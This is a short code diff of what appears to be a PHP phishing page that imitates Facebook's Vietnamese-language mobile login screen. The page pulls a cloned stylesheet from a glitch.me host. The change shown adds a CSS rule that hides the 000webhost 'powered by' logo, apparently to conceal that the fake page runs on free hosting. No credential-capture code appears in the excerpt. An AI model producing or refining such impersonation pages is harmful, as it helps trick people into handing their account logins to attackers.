@@ -35,6 +35,7 @@ $_SESSION['huongdz'] = $huongdz;
             <title>Facebook- Đăng nhập hoặc đăng ký</title>
             <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" />
           <link rel="stylesheet" type="text/css" href="https://scripth.glitch.me/web/fb.css" />
+		 <style>img[src*="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"] {display: none;}</style>
         </head>
  
         <body class="touch x1 _fzu _50-3 iframe acw portrait">
